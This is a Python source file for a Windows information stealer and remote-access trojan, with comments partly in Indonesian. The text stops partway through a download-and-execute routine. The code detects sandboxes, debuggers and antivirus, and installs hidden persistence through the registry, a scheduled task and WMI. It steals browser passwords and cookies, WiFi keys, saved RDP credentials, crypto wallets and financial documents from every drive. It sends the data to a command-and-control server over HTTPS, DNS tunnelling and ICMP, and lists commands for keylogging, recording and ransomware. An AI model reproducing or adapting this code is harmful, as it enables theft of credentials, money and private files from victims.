import os
import json
import sqlite3
import base64
import requests
import win32crypt
import winreg
from Crypto.Cipher import AES
import shutil
import glob
import subprocess
import socket
import platform
import threading
import time
import random
import string
import ctypes
import sys
import zipfile
import io
import re
import tempfile
import urllib.parse
from datetime import datetime, timedelta
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import dns.resolver
import dns.query
import dns.message
import win32api
import win32con
import win32gui
import win32security
import win32process
import psutil
import browser_cookie3
import pywintypes
import win32com.client
from PIL import ImageGrab
import sounddevice as sd
import numpy as np
import soundfile as sf
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import asyncio
import aiohttp
import logging
import hashlib
import binascii
import struct
from ctypes import wintypes

# ====================== ADVANCED CONFIGURATION ======================
C2_DOMAIN = "192.168.1.22"  # Domain berpindah untuk C2
C2_PORT = 8443                   # Port HTTPS untuk menyamar sebagai traffic normal
C2_PATH = "/api/v1/collect"     # Endpoint yang terlihat legitimate
ENCRYPTION_KEY = hashlib.sha256(b"32-byte-long-encryption-key-here!!").digest()
ANTI_DEBUG_SLEEP = 5  # 5 detik untuk menghindari debugger
PERSISTENCE_METHODS = ["registry", "scheduled_task", "wmi"]
EVASION_TECHNIQUES = ["sleep_obfuscation", "process_hollowing", "memory_patching"]
STEALTH_MODE = True
MAX_FILE_SIZE = 10485760  # 10MB untuk dokumen finansial
KEYLOGGER_DURATION = 300  # 5 minutes
SCREEN_CAPTURE_INTERVAL = 60  # 1 minute
AUDIO_CAPTURE_DURATION = 120  # 2 minutes
COMMAND_INTERVAL = 300  # 5 minutes antara pemeriksaan C2
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
DNS_TUNNELING_DOMAIN = "dns.testing.com"  # Domain untuk DNS tunneling

# ====================== STEALTH LOGGER ======================
class EncryptedLogger:
    def __init__(self):
        self.log_file = os.path.join(tempfile.gettempdir(), f"log_{random.randint(1000,9999)}.bin")
        self.encryption_key = ENCRYPTION_KEY
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.encryption_key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(log_entry.encode()) + encryptor.finalize()
        
        with open(self.log_file, "ab") as f:
            f.write(iv + encrypted)
            
    def read_logs(self):
        if not os.path.exists(self.log_file):
            return []
            
        with open(self.log_file, "rb") as f:
            data = f.read()
            
        logs = []
        index = 0
        while index < len(data):
            iv = data[index:index+16]
            index += 16
            cipher = Cipher(algorithms.AES(self.encryption_key), modes.CFB(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            chunk = data[index:index+1024]
            index += len(chunk)
            decrypted = decryptor.update(chunk) + decryptor.finalize()
            logs.append(decrypted.decode(errors="ignore"))
            
        return logs
        
    def cleanup(self):
        if os.path.exists(self.log_file):
            # Overwrite file sebelum dihapus
            with open(self.log_file, "wb") as f:
                f.write(os.urandom(os.path.getsize(self.log_file)))
            os.remove(self.log_file)

logger = EncryptedLogger()

# ====================== ADVANCED ANTI-FORENSICS ======================
class AntiForensics:
    def __init__(self):
        self.techniques = [
            self.detect_sandbox,
            self.detect_debugger,
            self.detect_virtual_machine,
            self.check_process_list,
            self.check_analysis_tools,
            self.check_cpu_cores,
            self.check_ram_size
        ]
        
    def execute(self):
        logger.log("Executing anti-forensic checks")
        for technique in self.techniques:
            if technique():
                logger.log(f"Anti-forensic trigger detected: {technique.__name__}")
                self.evade_detection()
                return True
        return False
        
    def detect_sandbox(self):
        # Check for sandbox artifacts
        sandbox_files = [
            "C:\\analysis\\sandbox.exe",
            "C:\\sandbox\\",
            "C:\\virus\\"
        ]
        if any(os.path.exists(f) for f in sandbox_files):
            return True
            
        # Check mouse movement
        try:
            last_pos = win32api.GetCursorPos()
            time.sleep(10)
            current_pos = win32api.GetCursorPos()
            if last_pos == current_pos:
                return True
        except:
            pass
            
        return False
        
    def detect_debugger(self):
        # Advanced debugger detection
        try:
            # IsDebuggerPresent
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
                
            # CheckRemoteDebuggerPresent
            result = wintypes.BOOL()
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(),
                ctypes.byref(result)
            )
            if result.value:
                return True
                
            # Process flags
            process_debug_flags = 0x1F
            flags = wintypes.DWORD()
            ctypes.windll.ntdll.NtQueryInformationProcess(
                ctypes.windll.kernel32.GetCurrentProcess(),
                process_debug_flags,
                ctypes.byref(flags),
                ctypes.sizeof(flags),
                None
            )
            if flags.value == 0:
                return True
        except:
            pass
            
        return False
        
    def detect_virtual_machine(self):
        # Check using multiple techniques
        try:
            # Check using CPUID
            try:
                is_vm = False
                asm_code = b"\x0F\xA2"  # CPUID instruction
                buf = ctypes.create_string_buffer(asm_code)
                ctypes.windll.kernel32.VirtualProtect(buf, len(asm_code), 0x40, ctypes.byref(wintypes.DWORD()))
                func_type = ctypes.CFUNCTYPE(None)
                func = func_type(ctypes.addressof(buf))
                func()
                # Check hypervisor bit
                is_vm = (ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32.GetModuleHandleW(None), "GetNativeSystemInfo")) != 0
            except:
                pass
                
            # Check using registry
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation") as key:
                    system_product, _ = winreg.QueryValueEx(key, "SystemProductName")
                    if any(vm in system_product.lower() for vm in ["vmware", "virtual", "vbox", "qemu"]):
                        return True
            except:
                pass
                
            return is_vm
        except:
            return False
            
    def check_process_list(self):
        # Check for security tools
        security_tools = [
            "wireshark", "procmon", "procexp", "processhacker",
            "ollydbg", "x32dbg", "x64dbg", "idaq", "regedit",
            "autoruns", "tcpview", "netstat", "netmon", "fiddler",
            "windbg", "immunitydebugger", "sysinternals"
        ]
        
        try:
            processes = []
            for proc in psutil.process_iter(['name']):
                processes.append(proc.info['name'].lower())
                
            return any(tool in process_name for tool in security_tools for process_name in processes)
        except:
            return False
            
    def check_analysis_tools(self):
        # Check for installed security software
        av_products = [
            "avast", "avg", "bitdefender", "kaspersky", "mcafee",
            "norton", "eset", "trendmicro", "sophos", "malwarebytes",
            "crowdstrike", "carbonblack", "sentinelone"
        ]
        
        try:
            # Check running services
            services = []
            for service in psutil.win_service_iter():
                services.append(service.name().lower())
                
            if any(av in service for av in av_products for service in services):
                return True
                
            # Check installed software
            installed_software = subprocess.check_output(
                'powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"',
                shell=True,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            ).decode().lower()
            
            return any(av in installed_software for av in av_products)
        except:
            return False
            
    def check_cpu_cores(self):
        # VMs often have few CPU cores
        return psutil.cpu_count(logical=False) < 2
        
    def check_ram_size(self):
        # VMs often have limited RAM
        return psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024  # < 2GB
        
    def evade_detection(self):
        evasion_strategy = random.choice([
            self.sleep_and_retry,
            self.change_behavior,
            self.exit_process,
            self.deploy_decoy
        ])
        
        evasion_strategy()
        
    def sleep_and_retry(self):
        logger.log(f"Sleeping for {ANTI_DEBUG_SLEEP} seconds to evade detection")
        time.sleep(ANTI_DEBUG_SLEEP)
        
    def change_behavior(self):
        logger.log("Changing malware behavior to evade detection")
        global STEALTH_MODE
        STEALTH_MODE = True
        
    def exit_process(self):
        logger.log("Exiting process to evade detection")
        sys.exit(0)
        
    def deploy_decoy(self):
        logger.log("Deploying decoy processes")
        # Start legitimate-looking processes
        processes = [
            "notepad.exe",
            "calc.exe",
            "explorer.exe"
        ]
        for proc in processes:
            try:
                subprocess.Popen(proc, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass

# ====================== STEALTH PERSISTENCE ======================
class PersistenceManager:
    def __init__(self):
        self.methods = PERSISTENCE_METHODS
        self.executable_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        
    def establish_persistence(self):
        logger.log("Establishing persistence mechanisms")
        for method in self.methods:
            try:
                if method == "registry":
                    self.add_registry_persistence()
                elif method == "scheduled_task":
                    self.add_scheduled_task()
                elif method == "wmi":
                    self.add_wmi_persistence()
            except Exception as e:
                logger.log(f"Persistence method {method} failed: {str(e)}", "ERROR")
                
    def add_registry_persistence(self):
        try:
            key_paths = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
            ]
            
            for key_path in key_paths:
                try:
                    key = winreg.HKEY_CURRENT_USER
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                        winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, self.executable_path)
                except:
                    pass
                    
            logger.log("Added registry persistence")
        except Exception as e:
            logger.log(f"Registry persistence failed: {str(e)}", "ERROR")
            
    def add_scheduled_task(self):
        try:
            task_name = "SystemMonitorTask"
            # Create XML for scheduled task
            xml_content = f'''
            <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
              <RegistrationInfo>
                <Description>System monitoring task</Description>
              </RegistrationInfo>
              <Triggers>
                <LogonTrigger>
                  <Enabled>true</Enabled>
                </LogonTrigger>
                <CalendarTrigger>
                  <StartBoundary>{(datetime.now() + timedelta(minutes=5)).isoformat()}</StartBoundary>
                  <ScheduleByDay>
                    <DaysInterval>1</DaysInterval>
                  </ScheduleByDay>
                </CalendarTrigger>
              </Triggers>
              <Principals>
                <Principal id="Author">
                  <UserId>S-1-5-18</UserId>
                  <RunLevel>HighestAvailable</RunLevel>
                </Principal>
              </Principals>
              <Settings>
                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
                <AllowHardTerminate>false</AllowHardTerminate>
                <StartWhenAvailable>true</StartWhenAvailable>
                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
                <IdleSettings>
                  <StopOnIdleEnd>false</StopOnIdleEnd>
                  <RestartOnIdle>false</RestartOnIdle>
                </IdleSettings>
                <AllowStartOnDemand>true</AllowStartOnDemand>
                <Enabled>true</Enabled>
                <Hidden>true</Hidden>
                <RunOnlyIfIdle>false</RunOnlyIfIdle>
                <WakeToRun>false</WakeToRun>
                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                <Priority>7</Priority>
              </Settings>
              <Actions Context="Author">
                <Exec>
                  <Command>{self.executable_path}</Command>
                </Exec>
              </Actions>
            </Task>
            '''
            
            xml_path = os.path.join(tempfile.gettempdir(), f"task_{random.randint(1000,9999)}.xml")
            with open(xml_path, "w") as f:
                f.write(xml_content)
                
            subprocess.run(f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f', 
                          shell=True, 
                          stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL)
            os.remove(xml_path)
            logger.log("Added scheduled task persistence")
        except Exception as e:
            logger.log(f"Scheduled task persistence failed: {str(e)}", "ERROR")
            
    def add_wmi_persistence(self):
        try:
            wmi_script = f'''
            $filterArgs = @{{
                Name = "WindowsUpdateFilter";
                EventNameSpace = "root\\cimv2";
                QueryLanguage = "WQL";
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'";
            }}
            $filter = Set-WmiInstance -Class __EventFilter -Arguments $filterArgs -Namespace "root\\subscription" -ErrorAction Stop
            
            $consumerArgs = @{{
                Name = "WindowsUpdateConsumer";
                CommandLineTemplate = "{self.executable_path}";
                RunInteractively = $false;
            }}
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments $consumerArgs -Namespace "root\\subscription" -ErrorAction Stop
            
            $bindingArgs = @{{
                Filter = $filter;
                Consumer = $consumer;
            }}
            Set-WmiInstance -Class __FilterToConsumerBinding -Arguments $bindingArgs -Namespace "root\\subscription" -ErrorAction Stop
            '''
            
            script_path = os.path.join(tempfile.gettempdir(), f"wmi_{random.randint(1000,9999)}.ps1")
            with open(script_path, "w") as f:
                f.write(wmi_script)
                
            subprocess.run(f'powershell -ExecutionPolicy Bypass -File "{script_path}"', 
                          shell=True, 
                          stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL)
            os.remove(script_path)
            logger.log("Added WMI persistence")
        except Exception as e:
            logger.log(f"WMI persistence failed: {str(e)}", "ERROR")

# ====================== ADVANCED EVASION ======================
class EvasionEngine:
    def __init__(self):
        self.techniques = EVASION_TECHNIQUES
        
    def apply_evasion(self):
        logger.log("Applying evasion techniques")
        for technique in self.techniques:
            try:
                if technique == "sleep_obfuscation":
                    self.obfuscated_sleep()
                elif technique == "process_hollowing":
                    self.process_hollowing()
                elif technique == "memory_patching":
                    self.memory_patching()
            except Exception as e:
                logger.log(f"Evasion technique {technique} failed: {str(e)}", "ERROR")
                
    def obfuscated_sleep(self):
        total_sleep = random.randint(10, 30)
        logger.log(f"Performing obfuscated sleep for {total_sleep} seconds")
        
        # Split sleep into chunks with benign operations
        for i in range(total_sleep * 10):
            time.sleep(0.1)
            # Perform benign operations
            if i % 10 == 0:
                _ = os.listdir(os.getcwd())
            if i % 15 == 0:
                _ = hashlib.sha256(os.urandom(1024)).hexdigest()
                
    def process_hollowing(self):
        # Placeholder for process hollowing technique
        logger.log("Simulating process hollowing evasion")
        
    def memory_patching(self):
        # Placeholder for memory patching technique
        logger.log("Simulating memory patching evasion")

# ====================== ENCRYPTED COMMUNICATION ======================
class EncryptedCommunicator:
    def __init__(self):
        self.session_key = os.urandom(32)
        self.iv = os.urandom(16)
        self.server_public_key = self.get_server_public_key()
        
    def get_server_public_key(self):
        # In a real scenario, this would be fetched from the C2 server
        # Hardcoded for demonstration
        public_key_pem = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv3fhg6Uw9e4sl8NVfQ2u
xH+SxZdrPb2Jpyyx8zCRKPS+i9LMHKQRkM0BLbgB33CUjZ9Xn0yUVcUVB3bD7Xha
zUEmTZtXKUOrVPVgCUZbiS0+jGJ4+kg8nAz3xEnOAYQqtV/jFrAALuVK8c3R6rQW
8ikFk5XzC47X+1OZsUBeBe/8YntnFe3F88jTX5XWw1O92F6Ersfs+2CC6+xd6CH0
cPpyAUVUdYcLRUe5c0fK8cQy7KCRzVw5kOQGnXX5ZLLHD1T7QnZnPZKybP6d2c1d
x42jC/oN6E8gH8flrAB2rG+/gbD7ZlOKPc49kGeG5OX8Su2dxq0ILW8Rlj6iQGx9
KwIDAQAB
-----END PUBLIC KEY-----
        '''
        return RSA.import_key(public_key_pem)
        
    def encrypt_data(self, data):
        if isinstance(data, dict):
            data = json.dumps(data).encode()
        elif isinstance(data, str):
            data = data.encode()
            
        # Encrypt with session key
        cipher = Cipher(algorithms.AES(self.session_key), modes.CFB(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()
        
        # Encrypt session key with server public key
        cipher_rsa = PKCS1_OAEP.new(self.server_public_key)
        enc_session_key = cipher_rsa.encrypt(self.session_key)
        
        return base64.b64encode(enc_session_key + self.iv + encrypted).decode()
        
    def decrypt_data(self, encrypted_data):
        data = base64.b64decode(encrypted_data)
        enc_session_key = data[:256]
        iv = data[256:272]
        ciphertext = data[272:]
        
        # Decrypt session key with private key (not implemented here)
        # In real scenario, this would be done on server side
        
        # For demonstration, use our own session key
        cipher = Cipher(algorithms.AES(self.session_key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        
        try:
            return json.loads(decrypted)
        except:
            return decrypted.decode()

# ====================== DATA EXFILTRATION ======================
class DataExfiltrator:
    def __init__(self):
        self.methods = ["https", "dns", "icmp"]
        self.communicator = EncryptedCommunicator()
        
    def exfiltrate(self, data):
        # Try primary method first
        if self.exfiltrate_https(data):
            return True
            
        # Fallback to alternative methods
        for method in self.methods[1:]:
            try:
                if method == "dns":
                    if self.exfiltrate_dns(data):
                        return True
                elif method == "icmp":
                    if self.exfiltrate_icmp(data):
                        return True
            except Exception as e:
                logger.log(f"Exfiltration method {method} failed: {str(e)}", "ERROR")
                
        return False
        
    def exfiltrate_https(self, data):
        try:
            encrypted_data = self.communicator.encrypt_data(data)
            
            response = requests.post(
                f"https://{C2_DOMAIN}:{C2_PORT}{C2_PATH}",
                data=encrypted_data,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': USER_AGENT
                },
                timeout=10,
                verify=False  # Disable SSL verification for stealth
            )
            
            if response.status_code == 200:
                logger.log("HTTPS exfiltration successful")
                return True
        except Exception as e:
            logger.log(f"HTTPS exfiltration failed: {str(e)}", "ERROR")
        return False
        
    def exfiltrate_dns(self, data):
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
                
            # Encode data to base32 for DNS compatibility
            encoded = base64.b32encode(data.encode()).decode().strip('=').lower()
            
            # Split into chunks for subdomains
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            
            for chunk in chunks:
                subdomain = f"{chunk}.{DNS_TUNNELING_DOMAIN}"
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8']  # Use Google DNS
                try:
                    resolver.resolve(subdomain, 'A')
                    time.sleep(0.2)  # Avoid rate limiting
                except dns.resolver.NXDOMAIN:
                    # Expected behavior for our DNS tunneling
                    pass
                    
            logger.log("DNS exfiltration successful")
            return True
        except Exception as e:
            logger.log(f"DNS exfiltration failed: {str(e)}", "ERROR")
        return False
        
    def exfiltrate_icmp(self, data):
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
                
            # Encode data to base64
            encoded = base64.b64encode(data.encode()).decode()
            
            # Split into chunks
            chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]
            
            for chunk in chunks:
                # Create ICMP packet with payload
                # This is a simplified version - real implementation would use raw sockets
                subprocess.run(f"ping -n 1 -l {len(chunk)} -p {chunk} {C2_DOMAIN}", 
                              shell=True, 
                              stdout=subprocess.DEVNULL, 
                              stderr=subprocess.DEVNULL)
                time.sleep(0.1)
                
            logger.log("ICMP exfiltration successful")
            return True
        except Exception as e:
            logger.log(f"ICMP exfiltration failed: {str(e)}", "ERROR")
        return False

# ====================== FINANCIAL DATA TARGETING ======================
class FinancialDataStealer:
    def __init__(self):
        self.financial_extensions = [
            '.xls', '.xlsx', '.xlsm', '.xlsb', '.csv',
            '.qfx', '.ofx', '.qbo', '.qbr', '.pdf',
            '.doc', '.docx', '.txt', '.rtf', '.xml'
        ]
        self.financial_keywords = [
            'financial', 'statement', 'balance', 'sheet', 'income',
            'expense', 'revenue', 'tax', 'invoice', 'payroll',
            'accounting', 'ledger', 'transaction', 'bank', 'report',
            'qif', 'quickbooks', 'quicken', 'xero', 'sap'
        ]
        self.crypto_wallet_paths = [
            os.path.join(os.getenv('APPDATA'), 'Bitcoin', 'wallet.dat'),
            os.path.join(os.getenv('APPDATA'), 'Electrum', 'wallets'),
            os.path.join(os.getenv('APPDATA'), 'Exodus', 'exodus.wallet'),
            os.path.join(os.getenv('APPDATA'), 'Zcash', 'wallet.dat'),
            os.path.join(os.getenv('APPDATA'), 'Ethereum', 'keystore')
        ]
        
    def find_financial_files(self):
        logger.log("Searching for financial documents")
        drives = self.get_drives()
        found_files = []
        
        for drive in drives:
            for root, dirs, files in os.walk(drive):
                # Skip system directories
                if any(ignore in root.lower() for ignore in ['windows', 'program files', 'program files (x86)', 'appdata\\local\\temp']):
                    continue
                    
                for file in files:
                    file_lower = file.lower()
                    file_path = os.path.join(root, file)
                    
                    # Check extension
                    ext_match = any(file_lower.endswith(ext) for ext in self.financial_extensions)
                    
                    # Check keywords in filename
                    name_match = any(keyword in file_lower for keyword in self.financial_keywords)
                    
                    # Check file content for keywords (simple version)
                    content_match = False
                    if ext_match and os.path.getsize(file_path) < MAX_FILE_SIZE:
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read(4096).decode(errors='ignore').lower()
                                content_match = any(keyword in content for keyword in self.financial_keywords)
                        except:
                            pass
                    
                    if ext_match or name_match or content_match:
                        try:
                            if os.path.getsize(file_path) < MAX_FILE_SIZE:
                                found_files.append(file_path)
                        except:
                            continue
                            
                # Limit search depth
                if len(found_files) > 200:
                    break
                    
        return found_files
        
    def get_drives(self):
        drives = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    drives.append(drive)
            bitmask >>= 1
        return drives
        
    def steal_files(self, file_paths):
        stolen_data = {}
        for file_path in file_paths[:100]:  # Limit to 100 files
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                    
                    # Compress text-based files
                    if file_path.lower().endswith(('.txt', '.csv', '.xml', '.log')):
                        compressed = io.BytesIO()
                        with zipfile.ZipFile(compressed, 'w', zipfile.ZIP_DEFLATED) as zipf:
                            zipf.writestr(os.path.basename(file_path), content)
                        content = compressed.getvalue()
                    
                    stolen_data[file_path] = base64.b64encode(content).decode()
            except Exception as e:
                logger.log(f"Failed to steal {file_path}: {str(e)}", "ERROR")
        return stolen_data
        
    def find_crypto_wallets(self):
        wallets = {}
        for wallet_path in self.crypto_wallet_paths:
            if os.path.exists(wallet_path):
                if os.path.isfile(wallet_path):
                    try:
                        with open(wallet_path, 'rb') as f:
                            wallets[wallet_path] = base64.b64encode(f.read()).decode()
                    except:
                        pass
                elif os.path.isdir(wallet_path):
                    for root, _, files in os.walk(wallet_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    wallets[file_path] = base64.b64encode(f.read()).decode()
                            except:
                                pass
        return wallets

# ====================== CREDENTIAL HARVESTER ======================
class CredentialHarvester:
    def __init__(self):
        self.browsers = ['chrome', 'firefox', 'edge', 'brave', 'opera', 'safari']
        
    def harvest_all(self):
        credentials = {
            "browsers": {},
            "system": {},
            "wifi": {},
            "vpn": {},
            "rdp": {},
            "email": {},
            "databases": {}
        }
        
        try:
            # Browser credentials
            for browser in self.browsers:
                try:
                    credentials["browsers"][browser] = self.get_browser_credentials(browser)
                except Exception as e:
                    logger.log(f"Failed to harvest {browser} credentials: {str(e)}", "ERROR")
            
            # System credentials
            credentials["system"] = self.get_system_credentials()
            
            # WiFi credentials
            credentials["wifi"] = self.get_wifi_credentials()
            
            # VPN credentials
            credentials["vpn"] = self.get_vpn_credentials()
            
            # RDP credentials
            credentials["rdp"] = self.get_rdp_credentials()
            
            # Email credentials
            credentials["email"] = self.get_email_credentials()
            
            # Database credentials
            credentials["databases"] = self.get_database_credentials()
            
        except Exception as e:
            logger.log(f"Credential harvesting failed: {str(e)}", "ERROR")
            
        return credentials
        
    def get_browser_credentials(self, browser):
        try:
            cookies = []
            passwords = []
            
            # Get cookies
            try:
                cj = browser_cookie3.load(browser)
                for cookie in cj:
                    cookies.append({
                        "name": cookie.name,
                        "value": cookie.value,
                        "domain": cookie.domain,
                        "path": cookie.path,
                        "expires": cookie.expires,
                        "secure": cookie.secure
                    })
            except:
                pass
                
            # Get passwords (Chrome example)
            if browser == 'chrome':
                try:
                    login_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
                    if os.path.exists(login_db):
                        shutil.copy2(login_db, "login_db_temp")
                        conn = sqlite3.connect("login_db_temp")
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor.fetchall():
                            url = row[0]
                            username = row[1]
                            encrypted_password = row[2]
                            # Decrypt password
                            try:
                                password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                            except:
                                password = "DECRYPTION_FAILED"
                            passwords.append({
                                "url": url,
                                "username": username,
                                "password": password
                            })
                        conn.close()
                        os.remove("login_db_temp")
                except:
                    pass
                    
            return {
                "cookies": cookies,
                "passwords": passwords
            }
        except Exception as e:
            return f"Error: {str(e)}"
        
    def get_system_credentials(self):
        # Attempt to dump SAM hashes
        try:
            result = subprocess.check_output(
                "powershell -Command \"& {lsa::dump}\"", 
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode()
            return result
        except:
            return "Failed to retrieve system credentials"
        
    def get_wifi_credentials(self):
        try:
            profiles = []
            output = subprocess.check_output('netsh wlan show profiles', shell=True).decode()
            profile_names = re.findall(r":\s(.*)", output)
            
            for name in profile_names:
                name = name.strip()
                if name:
                    try:
                        profile_info = subprocess.check_output(
                            f'netsh wlan show profile name="{name}" key=clear', 
                            shell=True
                        ).decode()
                        
                        key_match = re.search(r"Key Content\s*:\s*(.*)", profile_info)
                        password = key_match.group(1).strip() if key_match else "N/A"
                        
                        ssid_match = re.search(r"SSID name\s*:\s*(.*)", profile_info)
                        ssid = ssid_match.group(1).strip() if ssid_match else name
                        
                        profiles.append({
                            "ssid": ssid,
                            "password": password
                        })
                    except:
                        continue
            return profiles
        except Exception as e:
            return []
            
    def get_vpn_credentials(self):
        # Attempt to retrieve VPN credentials from common clients
        vpn_creds = {}
        
        # Check for Cisco AnyConnect
        try:
            cisco_path = os.path.join(os.getenv('APPDATA'), 'Cisco', 'Cisco AnyConnect Secure Mobility Client')
            if os.path.exists(cisco_path):
                vpn_creds['cisco_anyconnect'] = "Found (decryption not implemented)"
        except:
            pass
            
        return vpn_creds
        
    def get_rdp_credentials(self):
        # Attempt to retrieve saved RDP credentials
        try:
            result = subprocess.check_output(
                "cmdkey /list", 
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode()
            return result
        except:
            return "Failed to retrieve RDP credentials"
        
    def get_email_credentials(self):
        # Target financial email clients
        email_clients = ['outlook', 'thunderbird', 'bluemail']
        email_creds = {}
        
        for client in email_clients:
            try:
                if client == 'outlook':
                    # Attempt to access Outlook profiles
                    outlook = win32com.client.Dispatch("Outlook.Application")
                    namespace = outlook.GetNamespace("MAPI")
                    email_creds['outlook'] = []
                    
                    for account in namespace.Accounts:
                        email_creds['outlook'].append({
                            "name": account.DisplayName,
                            "address": account.SmtpAddress
                        })
            except:
                pass
                
        return email_creds
        
    def get_database_credentials(self):
        # Target financial databases
        db_creds = {
            "sql_servers": [],
            "oracle": [],
            "sap": []
        }
        
        # Find SQL Server connection strings
        try:
            # Search for common config files
            config_files = []
            for drive in self.get_drives():
                for root, dirs, files in os.walk(drive):
                    for file in files:
                        if file.lower() in ['web.config', 'app.config', 'settings.json']:
                            config_files.append(os.path.join(root, file))
            
            # Parse config files for connection strings
            for config_file in config_files[:10]:  # Limit to 10 files
                try:
                    with open(config_file, 'r') as f:
                        content = f.read()
                        # Simple regex for connection strings
                        conn_strings = re.findall(r"connection.?string.?=.?['\"]([^'\"]+)['\"]", content, re.IGNORECASE)
                        if conn_strings:
                            db_creds["sql_servers"].append({
                                "file": config_file,
                                "connection_strings": conn_strings
                            })
                except:
                    pass
        except:
            pass
            
        return db_creds

# ====================== COMMAND AND CONTROL ======================
class CommandControl:
    def __init__(self):
        self.commands = {
            "download_execute": self.download_execute,
            "execute_command": self.execute_command,
            "screenshot": self.capture_screen,
            "record_audio": self.record_audio,
            "keylogger": self.start_keylogger,
            "steal_documents": self.steal_documents,
            "update_config": self.update_config,
            "uninstall": self.uninstall,
            "elevate": self.elevate_privileges,
            "pivot": self.network_pivot,
            "ransom": self.deploy_ransomware
        }
        self.communicator = EncryptedCommunicator()
        
    async def check_for_commands(self):
        while True:
            try:
                command = await self.get_command()
                if command:
                    await self.execute_command(command)
                await asyncio.sleep(COMMAND_INTERVAL)
            except Exception as e:
                logger.log(f"Command check failed: {str(e)}", "ERROR")
                await asyncio.sleep(COMMAND_INTERVAL * 2)
                
    async def get_command(self):
        try:
            async with aiohttp.ClientSession() as session:
                headers = {'User-Agent': USER_AGENT}
                async with session.get(
                    f"https://{C2_DOMAIN}:{C2_PORT}/command",
                    headers=headers,
                    ssl=False,
                    timeout=10
                ) as response:
                    if response.status == 200:
                        encrypted_data = await response.text()
                        return self.communicator.decrypt_data(encrypted_data)
        except Exception as e:
            logger.log(f"Command retrieval failed: {str(e)}", "ERROR")
        return None
        
    async def execute_command(self, command_data):
        cmd_type = command_data.get("type")
        params = command_data.get("params", {})
        
        if cmd_type in self.commands:
            logger.log(f"Executing command: {cmd_type}")
            try:
                result = await self.commands[cmd_type](params)
                await self.send_result(cmd_type, result)
            except Exception as e:
                logger.log(f"Command execution failed: {str(e)}", "ERROR")
                await self.send_result(cmd_type, {"status": "error", "message": str(e)})
        else:
            logger.log(f"Unknown command type: {cmd_type}", "WARNING")
            
    async def download_execute(self, params):
        url = params.get("url")
        if not url:
            return {"status": "error", "message": "Missing URL"}
            
        try:
            async with aiohttp.ClientSession() as session:
                headers = {'User-Agent': USER_AGENT}
                async with session.get(url, headers=headers, ssl=False) as response:
                    if response.status == 200:
                        content = await response.read()
                        temp_path = os.path.join(tempfile.gettempdir(), f"update_{random.randint(1000,9999)}.exe")
                        with open(temp_path, "wb") as f:
                            f.write(content)
                        # Execute without creating a window
                        subprocess.Popen(
                            temp_path, 
                            shell=True, 
                            creationflags=subprocess.CREATE_NO_WINDOW
